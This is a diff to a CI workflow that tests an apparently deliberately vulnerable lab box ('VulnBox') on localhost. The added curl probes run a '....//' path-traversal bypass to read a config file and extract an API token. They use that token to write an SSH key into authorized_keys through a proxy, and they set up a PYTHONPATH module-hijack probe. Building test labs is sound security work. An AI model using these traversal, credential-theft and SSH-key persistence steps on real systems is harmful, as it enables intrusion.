@@ -73,6 +73,7 @@ jobs:
       - name: Run E2E HTTP probes against Flask and PHP services
         run: |
           set -euo pipefail
+          sudo mkdir -p /var/log/webapp
           export VULNBOX_CONFIG="$PWD/box/src/internal_api/config.ini"
           export VULNBOX_AUTH_KEYS_FILE="/tmp/vulnbox_ci_authorized_keys"
           rm -f "$VULNBOX_AUTH_KEYS_FILE"
@@ -80,7 +81,7 @@ jobs:
           FLASK_PID=$!
           php -S 127.0.0.1:8080 -t box/src/web >/tmp/php.log 2>&1 &
           PHP_PID=$!
-          trap 'STATUS=$?; if [ "$STATUS" -ne 0 ]; then echo "--- flask.log ---"; cat /tmp/flask.log || true; echo "--- php.log ---"; cat /tmp/php.log || true; fi; kill "$FLASK_PID" "$PHP_PID" 2>/dev/null || true' EXIT
+          trap 'STATUS=$?; if [ "$STATUS" -ne 0 ]; then echo "--- flask.log ---"; cat /tmp/flask.log || true; echo "--- php.log ---"; cat /tmp/php.log || true; fi; kill "$FLASK_PID" "$PHP_PID" 2>/dev/null || true; sudo rmdir /var/log/webapp 2>/dev/null || true' EXIT
 
           READY=0
           for _ in $(seq 1 15); do
@@ -92,12 +93,24 @@ jobs:
           done
           test "$READY" -eq 1
 
+          # Stage 2: Health, single-pass ../ rejection (404), and ....// traversal bypass (CWE-22)
           curl -fsS http://127.0.0.1:5000/health | python3 -c "import sys, json; d = json.load(sys.stdin); assert d['status'] == 'ok'"
           curl -fsS "http://127.0.0.1:8080/?module=status" | grep -q 'VulnBox'
-          curl -fsS "http://127.0.0.1:8080/?proxy_path=/api/v1/info&token=vb-internal-9f8e7d6c5b4a3f2e1d0c" | grep -q 'vulnbox-internal-api'
-          curl -fsS -X POST "http://127.0.0.1:8080/?proxy_path=/api/v1/ssh-key&token=vb-internal-9f8e7d6c5b4a3f2e1d0c" \
+          HTTP_404=$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:8080/?log=../../../${PWD#/}/box/src/internal_api/config.ini")
+          test "$HTTP_404" -eq 404
+          TOKEN=$(curl -fsS "http://127.0.0.1:8080/?log=....//....//....//${PWD#/}/box/src/internal_api/config.ini" | awk -F'=' '/^api_token[[:space:]]*=/{gsub(/[[:space:]]/, "", $2); print $2}')
+          test -n "$TOKEN"
+
+          # Stage 3: Auth rejection without/with wrong token (CWE-798) and proxy bridge SSH key write
+          HTTP_403=$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:5000/api/v1/info)
+          test "$HTTP_403" -eq 403
+          curl -fsS "http://127.0.0.1:8080/?proxy_path=/api/v1/info&token=wrong" | grep -q 'Unauthorized'
+          curl -fsS "http://127.0.0.1:8080/?proxy_path=/api/v1/info&token=${TOKEN}" | grep -q 'vulnbox-internal-api'
+          curl -fsS -X POST "http://127.0.0.1:8080/?proxy_path=/api/v1/ssh-key&token=${TOKEN}" \
             --data-urlencode "ssh_key=ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITestKey lab@vulnbox" | grep -q 'registered'
           grep -q 'AAAAC3NzaC1lZDI1NTE5AAAAITestKey' "$VULNBOX_AUTH_KEYS_FILE"
+
+          # Stage 5: PYTHONPATH module hijack (CWE-427) and cron backup runner check
           python3 box/src/admin/maintenance.py | grep -q 'VulnBox'
           TMP_PY_PROBE="$(mktemp -d)"
           printf 'def collect_system_summary():\n    return {"probe": "pythonpath_override"}\n' > "${TMP_PY_PROBE}/status_helper.py"
